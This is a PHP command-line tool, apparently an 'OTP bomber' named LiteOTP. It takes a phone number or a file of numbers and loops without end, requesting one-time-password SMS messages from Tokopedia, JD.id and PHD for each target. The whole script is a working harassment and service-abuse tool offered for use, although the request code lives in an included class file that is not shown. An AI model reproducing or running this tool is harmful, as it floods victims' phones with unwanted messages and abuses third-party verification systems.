#!/usr/bin/env php
<?php
require "lite.class.php";
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = '';
    $RR = '';
    $G  = '';
    $GG = '';
    $B  = '';
    $BB = '';
    $Y  = '';
    $YY = '';
    $X  = '';
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m\n";
    system('clear');
}

echo $Y.
'
 _     _ _        ___ _____ ____  
| |   (_) |_ ___ / _ \_   _|  _ \ 
| |   | | __/ _ \ | | || | | |_) |
| |___| | ||  __/ |_| || | |  __/ 
|_____|_|\__\___|\___/ |_| |_|';
echo $R."\n".'++++++++++++++++++++++++++++++++++++++';
echo $B."\n".'Author  : Cvar1984                   '.$R.'+';
echo $B."\n".'Github  : https://github.com/Cvar1984'.$R.'+';
echo $B."\n".'Team    : BlackHole Security         '.$R.'+';
echo $B."\n".'Version : 2.4                        '.$R.'+';
echo $B."\n".'Date    : 13-03-2018                 '.$R.'+';
echo $R."\n".'++++++++++++++++++++++++++++++++++++++'.$G.$X."\n";
isset($argv[1]) OR die($RR.'[!] Input No List [!]'.$X);
$bom=new otp();
if(is_numeric($argv[1])) {
	ob_start();
	echo $bom->otp($argv[1],'tokopedia');
	ob_get_clean();
	while(1) {
		echo $G.'Send OTP to '.$Y.'['.$argv[1].']'.$X;
		ob_start();
		echo $bom->otp($argv[1],'jdid');
		echo $bom->otp($argv[1],'phd');
		ob_get_clean();
	}
}
	else {
		if(file_exists($argv[1])) {
			$argv[1]=file_get_contents($argv[1]);
			$argv[1]=str_replace(' ','',$argv[1]);
			$argv[1]=explode("\n",$argv[1]);
			$count=sizeof($argv[1]);
			
			while(1) {
				for($x=0;$x<$count;$x++) {
					echo $G.'Send OTP to '.$Y.'['.$argv[1][$x].']'.$X;
					ob_start();
					echo $bom->otp($argv[1][$x],'tokopedia');
					echo $bom->otp($argv[1][$x],'jdid');
					echo $bom->otp($argv[1][$x],'phd');
					ob_get_clean();
				}
			}
		}
		die($RR.'File not exist'.$X);
	}
